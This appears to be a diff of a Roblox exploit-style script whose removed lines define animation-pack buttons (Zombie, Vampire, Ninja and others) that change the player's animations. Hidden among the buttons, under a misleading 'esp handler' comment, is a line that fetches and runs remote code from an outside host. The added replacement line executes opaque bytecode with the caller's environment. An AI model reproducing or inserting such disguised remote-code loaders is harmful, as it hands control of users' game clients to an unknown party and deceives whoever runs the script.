-	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
-	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
-	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
-	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
-	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
-	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616086039"
-	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
-	game.Players.LocalPlayer.Character.Humanoid.Jump = true
-end)
-
-local AnimationsButton = AnimationsPage.AddButton("Zombie", function()
-	local Animate = game.Players.LocalPlayer.Character.Animate
-	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
-	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
-	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
-	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
-	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
-	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
-	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
-	game.Players.LocalPlayer.Character.Humanoid.Jump = true
-end)
-
-
-local AnimationsButton = AnimationsPage.AddButton("Vampire", function()
-	local Animate = game.Players.LocalPlayer.Character.Animate
-	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
-	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
-	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
-	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
-	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
-	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
-	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
-	game.Players.LocalPlayer.Character.Humanoid.Jump = true
-end)
-
-local AnimationsButton = AnimationsPage.AddButton("Toy", function()
-	local Animate = game.Players.LocalPlayer.Character.Animate
-	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
-	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
-	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
-	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
-	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
-	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
-	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
-	game.Players.LocalPlayer.Character.Humanoid.Jump = true
-end)
-
-local AnimationsButton = AnimationsPage.AddButton("Superhero", function()
-	local Animate = game.Players.LocalPlayer.Character.Animate
-	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
-	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
-	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
-	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
-	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
-	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
-	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
-	game.Players.LocalPlayer.Character.Humanoid.Jump = true
-end)
-
-local AnimationsButton = AnimationsPage.AddButton("Stylish", function()
-	local Animate = game.Players.LocalPlayer.Character.Animate
-	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616136790"
-	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616138447"
-	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616146177"
-	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616140816"
-	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616139451"
-	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616133594"
-	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616134815"
-	game.Players.LocalPlayer.Character.Humanoid.Jump = true
-end)
-
-local AnimationsButton = AnimationsPage.AddButton("Robot", function()
-	local Animate = game.Players.LocalPlayer.Character.Animate
-	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616088211"
-	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616089559"
-	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616095330"
-	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616091570"
-	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616090535"
-	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616086039"
-	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616087089"
-	game.Players.LocalPlayer.Character.Humanoid.Jump = true
-end)
-local AnimationsButton = AnimationsPage.AddButton("Pirate", function()
-	local Animate = game.Players.LocalPlayer.Character.Animate
-	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
-	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
-	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
-	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
-	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
-	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
-	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
-	game.Players.LocalPlayer.Character.Humanoid.Jump = true
-end)
-local AnimationsButton = AnimationsPage.AddButton("Ninja", function()
-	local Animate = game.Players.LocalPlayer.Character.Animate
-	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
-	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
-	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
-	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
-	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
-	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
-	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
-	game.Players.LocalPlayer.Character.Humanoid.Jump = true
-end)
--- // esp handler
-loadstring(game:HttpGet("https://iexploit.xyz/api/bdc"))()
-
-local AnimationsButton = AnimationsPage.AddButton("Mage", function()
-	local Animate = game.Players.LocalPlayer.Character.Animate
-	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
-	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
-	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
-	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
-	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
-	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
-	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
-	game.Players.LocalPlayer.Character.Humanoid.Jump = true
-end)
+load_bytecode(code, getfenv())()
